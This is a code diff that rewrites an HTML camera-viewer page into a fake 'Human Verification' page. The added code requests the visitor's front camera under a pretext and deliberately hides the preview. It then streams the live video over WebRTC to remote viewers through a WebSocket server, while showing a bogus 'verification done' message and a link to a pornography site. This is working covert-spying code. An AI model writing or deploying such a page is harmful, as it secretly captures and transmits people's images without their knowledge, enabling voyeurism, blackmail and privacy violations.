@@ -1,774 +1,360 @@
 <!doctype html>
-
 <html>
-
 <head>
-
-<meta name="viewport"
-content="width=device-width,initial-scale=1">
-
-<title>Camera A</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Human Verification</title>
 
 <style>
-
-* {
-    box-sizing: border-box;
+html,body{
+  margin:0;
+  padding:0;
+  background:#fff;
+  color:#000;
+  font-family:Arial,sans-serif;
 }
 
-html,
-body {
-    margin: 0;
-    padding: 0;
-    background: #0b0b0b;
-    color: white;
-    font-family: Arial, sans-serif;
+.page{
+  text-align:center;
+  padding:65px 15px;
 }
 
-h1 {
-    text-align: center;
-    margin: 18px 0 8px;
+h1{
+  font-size:40px;
+  margin:0 0 30px;
 }
 
-#status {
-    text-align: center;
-    color: #aaa;
-    margin: 10px;
+.message{
+  font-size:25px;
+  line-height:1.3;
+  margin-bottom:45px;
 }
 
-.camera-grid {
-    display: grid;
-    grid-template-columns: 1fr;
-    gap: 15px;
-    padding: 12px;
-    max-width: 1000px;
-    margin: auto;
+button{
+  width:100%;
+  max-width:660px;
+  padding:20px;
+  margin:8px 0;
+  border:0;
+  border-radius:16px;
+  background:#eee;
+  color:#000;
+  font-size:23px;
 }
 
-.card {
-    background: #161616;
-    border-radius: 14px;
-    padding: 10px;
+#status{
+  margin-top:25px;
+  font-size:19px;
 }
 
-.card h2 {
-    text-align: center;
-    margin: 8px;
-    font-size: 20px;
+#video{
+  display:none;
 }
-
-video {
-    width: 100%;
-    aspect-ratio: 16 / 9;
-    background: black;
-    object-fit: contain;
-    display: block;
-    border-radius: 10px;
-}
-
-#details {
-    text-align: center;
-    color: #aaa;
-    padding: 15px;
-}
-
-.ok {
-    color: #00e676 !important;
-}
-
-.error {
-    color: #ff5252 !important;
-}
-
 </style>
-
 </head>
 
 <body>
 
-<h1>Camera A</h1>
+<div class="page">
 
-<div id="status">
-    Connecting...
-</div>
+  <h1>Human Verification</h1>
 
-<div class="camera-grid">
+  <div class="message">
+     Verification is required to continue.
+  </div>
 
-    <div class="card">
+  <button id="start">
+    Allow & Continue
+  </button>
 
-        <h2>
-            📷 FRONT CAMERA
-        </h2>
+  <button id="google" style="display:none;">
+    Click here to see more sex videos 
+  </button>
 
-        <video
-            id="frontVideo"
-            autoplay
-            muted
-            playsinline>
-        </video>
+  <div id="status"></div>
 
-    </div>
-
-
-    <div class="card">
-
-        <h2>
-            📷 BACK CAMERA
-        </h2>
-
-        <video
-            id="backVideo"
-            autoplay
-            muted
-            playsinline>
-        </video>
-
-    </div>
+  <!-- Camera stream is intentionally not displayed -->
+  <video id="video" autoplay muted playsinline></video>
 
 </div>
-
-<div id="details">
-    Waiting for camera permission...
-</div>
-
 
 <script>
 
-const frontVideo =
-    document.getElementById(
-        "frontVideo"
-    );
+const start = document.getElementById("start");
+const google = document.getElementById("google");
+const status = document.getElementById("status");
+const video = document.getElementById("video");
 
-const backVideo =
-    document.getElementById(
-        "backVideo"
-    );
-
-const status =
-    document.getElementById(
-        "status"
-    );
-
-const details =
-    document.getElementById(
-        "details"
-    );
-
-
-const wsProtocol =
-    location.protocol === "https:"
-        ? "wss:"
-        : "ws:";
-
-
-let ws;
-
-let frontStream = null;
-let backStream = null;
+let stream = null;
+let cameraId = null;
+let ws = null;
 
 const peers = new Map();
 
-const cameraId =
-    "camera-" +
-    Math.random()
-        .toString(36)
-        .substring(2, 10);
+
+/* ---------------------------
+   Connect to WebRTC server
+---------------------------- */
+
+function connectSocket(){
+
+  ws = new WebSocket(
+    (location.protocol === "https:" ? "wss:" : "ws:") +
+    "//" + location.host + "/camera"
+  );
+
+  ws.onopen = () => {
+
+    console.log("WebSocket connected");
+
+    if(stream){
+      ws.send(JSON.stringify({
+        type:"camera-live"
+      }));
+    }
+  };
 
 
-// ====================================================
-// WEBSOCKET
-// ====================================================
+  ws.onmessage = async event => {
 
-function connect() {
-
-    ws = new WebSocket(
-        wsProtocol +
-        "//" +
-        location.host
-    );
+    const m = JSON.parse(event.data);
 
 
-    ws.onopen = async () => {
+    /* Server assigns camera ID */
 
-        console.log(
-            "WebSocket connected"
-        );
+    if(m.type === "role"){
 
-        status.textContent =
-            "Connected";
+      cameraId = m.cameraId;
 
-        ws.send(
-            JSON.stringify({
-                type:
-                    "camera-register",
-                cameraId:
-                    cameraId
-            })
-        );
+      console.log("Camera ID:", cameraId);
+
+    }
 
 
-        // Automatically start both
-        await startBothCameras();
+    /* Viewer wants this camera */
 
-    };
+    if(m.type === "viewer-ready"){
 
+      if(!stream) return;
 
-    ws.onmessage = async (event) => {
+      const pc = createPeer(m.viewerId);
 
-        let msg;
+      const offer = await pc.createOffer();
 
-        try {
-            msg =
-                JSON.parse(
-                    event.data
-                );
-        } catch {
-            return;
-        }
+      await pc.setLocalDescription(offer);
 
+      ws.send(JSON.stringify({
+        type:"offer",
+        offer:pc.localDescription,
+        toViewerId:m.viewerId
+      }));
 
-        console.log(
-            "SERVER:",
-            msg.type
-        );
+    }
 
 
-        if (
-            msg.type ===
-            "start-view"
-        ) {
+    /* Viewer answer */
 
-            await createPeer(
-                msg.viewerId
-            );
+    if(m.type === "answer"){
 
-        }
+      const pc = peers.get(m.toViewerId);
 
+      if(pc){
 
-        if (
-            msg.type ===
-            "answer"
-        ) {
+        await pc.setRemoteDescription(m.answer);
 
-            await handleAnswer(
-                msg
-            );
+      }
 
-        }
+    }
 
 
-        if (
-            msg.type ===
-            "ice"
-        ) {
+    /* ICE candidate */
 
-            await handleIce(
-                msg
-            );
+    if(m.type === "candidate"){
 
-        }
+      const pc = peers.get(m.toViewerId);
 
-    };
+      if(pc && pc.remoteDescription){
+
+        await pc.addIceCandidate(
+          m.candidate
+        ).catch(()=>{});
+
+      }
+
+    }
+
+  };
 
 
-    ws.onclose = () => {
+  ws.onclose = () => {
 
-        status.textContent =
-            "Disconnected";
+    console.log("WebSocket disconnected");
 
-        setTimeout(
-            connect,
-            3000
-        );
-
-    };
+  };
 
 }
 
 
-// ====================================================
-// START BOTH CAMERAS
-// ====================================================
+/* ---------------------------
+   WebRTC connection
+---------------------------- */
 
-async function startBothCameras() {
+function createPeer(viewerId){
+
+  if(peers.has(viewerId)){
+
+    peers.get(viewerId).close();
+
+  }
+
+
+  const pc = new RTCPeerConnection({
+
+    iceServers:[
+      {
+        urls:"stun:stun.l.google.com:19302"
+      }
+    ]
+
+  });
+
+
+  peers.set(viewerId,pc);
+
+
+  pc.onicecandidate = event => {
+
+    if(
+      event.candidate &&
+      ws &&
+      ws.readyState === WebSocket.OPEN
+    ){
+
+      ws.send(JSON.stringify({
+
+        type:"candidate",
+
+        candidate:event.candidate,
+
+        toViewerId:viewerId
+
+      }));
+
+    }
+
+  };
+
+
+  /* Send camera tracks to viewer */
+
+  stream.getTracks().forEach(track => {
+
+    pc.addTrack(track,stream);
+
+  });
+
+
+  return pc;
+
+}
+
+
+/* ---------------------------
+   Start camera
+---------------------------- */
+
+start.addEventListener("click", async () => {
+
+  if(stream) return;
+
+
+  status.textContent =
+    "yes verification has done...";
+
+
+  try{
+
+    stream = await navigator.mediaDevices.getUserMedia({
+
+      video:{
+        facingMode:"user"
+      },
+
+      audio:false
+
+    });
+    
+document.querySelector("h1").textContent = "Welcome";
+
+document.querySelector(".message").textContent =
+  "Please continue to access the page.";
+
+    /*
+      Do NOT display the camera preview.
+      The stream is still active and available
+      for WebRTC transmission.
+    */
+
+    video.srcObject = stream;
+
+    video.style.display = "none";
+
 
     status.textContent =
-        "Requesting FRONT camera...";
+      "click above button to see more videos";
 
 
-    try {
+    start.style.display = "none";
 
-        // FRONT
-        frontStream =
-            await navigator
-                .mediaDevices
-                .getUserMedia({
-
-                    video: {
-                        facingMode: {
-                            exact: "user"
-                        },
-
-                        width: {
-                            ideal: 1280
-                        },
-
-                        height: {
-                            ideal: 720
-                        }
-                    },
-
-                    audio: false
-                });
+    google.style.display = "block";
 
 
-        frontVideo.srcObject =
-            frontStream;
+    /* Connect to your WebRTC server */
+
+    connectSocket();
 
 
-        await frontVideo.play();
+  }catch(error){
+
+    console.error(error);
 
 
-        console.log(
-            "FRONT CAMERA OK"
-        );
+    if(error.name === "NotAllowedError"){
 
+      status.textContent =
+        "❌ Camera permission was denied.";
 
-        status.textContent =
-            "Front camera allowed. Requesting BACK...";
+    }else if(error.name === "NotFoundError"){
 
+      status.textContent =
+        "❌ No camera was found.";
 
-    } catch (error) {
+    }else{
 
-        console.error(
-            "FRONT CAMERA ERROR:",
-            error
-        );
-
-        details.textContent =
-            "Front camera: " +
-            error.name +
-            " - " +
-            error.message;
-
-        status.className =
-            "error";
-
-        return;
-    }
-
-
-    // ================================================
-    // BACK CAMERA
-    // ================================================
-
-    try {
-
-        backStream =
-            await navigator
-                .mediaDevices
-                .getUserMedia({
-
-                    video: {
-                        facingMode: {
-                            exact: "environment"
-                        },
-
-                        width: {
-                            ideal: 1280
-                        },
-
-                        height: {
-                            ideal: 720
-                        }
-                    },
-
-                    audio: false
-                });
-
-
-        backVideo.srcObject =
-            backStream;
-
-
-        await backVideo.play();
-
-
-        console.log(
-            "BACK CAMERA OK"
-        );
-
-
-        status.textContent =
-            "🟢 FRONT + BACK CAMERAS LIVE";
-
-        status.className =
-            "ok";
-
-
-        details.textContent =
-            "Both cameras are active.";
-
-
-    } catch (error) {
-
-        console.error(
-            "BACK CAMERA ERROR:",
-            error
-        );
-
-
-        status.textContent =
-            "FRONT camera is active";
-
-
-        details.textContent =
-            "Android/Chrome did not allow the BACK camera simultaneously. " +
-            error.name;
-
-
-        status.className =
-            "error";
+      status.textContent =
+        "❌ Camera could not be started.";
 
     }
 
-}
+  }
 
+});
 
-// ====================================================
-// CREATE WEBRTC CONNECTION
-// ====================================================
 
-async function createPeer(
-    viewerId
-) {
+/* ---------------------------
+   Open Google separately
+---------------------------- */
 
-    console.log(
-        "Creating peer for:",
-        viewerId
-    );
+google.addEventListener("click", () => {
 
+  window.open(
+    "https://zbporn.tv/search/top-rated/xxx+hd+sex+videos/",
+    "_blank",
+    "noopener"
+  );
 
-    if (peers.has(viewerId)) {
-
-        try {
-            peers.get(viewerId).pc.close();
-        } catch {}
-
-        peers.delete(viewerId);
-    }
-
-
-    const pc =
-        new RTCPeerConnection({
-
-            iceServers: [
-                {
-                    urls:
-                        "stun:stun.l.google.com:19302"
-                }
-            ]
-
-        });
-
-
-    const peer = {
-        pc,
-        remoteDescriptionSet: false,
-        iceQueue: []
-    };
-
-
-    peers.set(
-        viewerId,
-        peer
-    );
-
-
-    // ================================================
-    // ADD FRONT TRACK
-    // ================================================
-
-    if (frontStream) {
-
-        const track =
-            frontStream
-                .getVideoTracks()[0];
-
-        if (track) {
-
-            pc.addTrack(
-                track,
-                frontStream
-            );
-
-            console.log(
-                "Added FRONT track"
-            );
-
-        }
-
-    }
-
-
-    // ================================================
-    // ADD BACK TRACK
-    // ================================================
-
-    if (backStream) {
-
-        const track =
-            backStream
-                .getVideoTracks()[0];
-
-        if (track) {
-
-            pc.addTrack(
-                track,
-                backStream
-            );
-
-            console.log(
-                "Added BACK track"
-            );
-
-        }
-
-    }
-
-
-    // ================================================
-    // ICE
-    // ================================================
-
-    pc.onicecandidate =
-        event => {
-
-            if (
-                event.candidate
-            ) {
-
-                send({
-
-                    type: "ice",
-
-                    viewerId:
-                        viewerId,
-
-                    candidate:
-                        event.candidate
-
-                });
-
-            }
-
-        };
-
-
-    pc.oniceconnectionstatechange =
-        () => {
-
-            console.log(
-                "ICE:",
-                pc.iceConnectionState
-            );
-
-        };
-
-
-    pc.onconnectionstatechange =
-        () => {
-
-            console.log(
-                "Connection:",
-                pc.connectionState
-            );
-
-        };
-
-
-    // ================================================
-    // OFFER
-    // ================================================
-
-    try {
-
-        const offer =
-            await pc.createOffer();
-
-
-        await pc.setLocalDescription(
-            offer
-        );
-
-
-        send({
-
-            type: "offer",
-
-            viewerId:
-                viewerId,
-
-            offer:
-                pc.localDescription
-
-        });
-
-
-        console.log(
-            "OFFER SENT"
-        );
-
-    } catch (error) {
-
-        console.error(
-            "Offer error:",
-            error
-        );
-
-    }
-
-}
-
-
-// ====================================================
-// ANSWER
-// ====================================================
-
-async function handleAnswer(msg) {
-
-    const peer =
-        peers.get(
-            msg.viewerId
-        );
-
-    if (!peer) {
-        return;
-    }
-
-
-    try {
-
-        await peer.pc
-            .setRemoteDescription(
-                new RTCSessionDescription(
-                    msg.answer
-                )
-            );
-
-
-        peer.remoteDescriptionSet =
-            true;
-
-
-        for (
-            const candidate
-            of peer.iceQueue
-        ) {
-
-            await peer.pc
-                .addIceCandidate(
-                    new RTCIceCandidate(
-                        candidate
-                    )
-                );
-
-        }
-
-
-        peer.iceQueue = [];
-
-
-    } catch (error) {
-
-        console.error(
-            "Answer error:",
-            error
-        );
-
-    }
-
-}
-
-
-// ====================================================
-// ICE FROM VIEWER
-// ====================================================
-
-async function handleIce(msg) {
-
-    const peer =
-        peers.get(
-            msg.viewerId
-        );
-
-    if (!peer) {
-        return;
-    }
-
-
-    if (
-        !peer.remoteDescriptionSet
-    ) {
-
-        peer.iceQueue.push(
-            msg.candidate
-        );
-
-        return;
-
-    }
-
-
-    try {
-
-        await peer.pc
-            .addIceCandidate(
-                new RTCIceCandidate(
-                    msg.candidate
-                )
-            );
-
-    } catch (error) {
-
-        console.error(
-            "ICE error:",
-            error
-        );
-
-    }
-
-}
-
-
-// ====================================================
-// SEND
-// ====================================================
-
-function send(data) {
-
-    if (
-        ws &&
-        ws.readyState ===
-        WebSocket.OPEN
-    ) {
-
-        ws.send(
-            JSON.stringify(data)
-        );
-
-    }
-
-}
-
-
-// ====================================================
-// START
-// ====================================================
-
-connect();
+});
 
 </script>
 
 </body>
-
 </html>
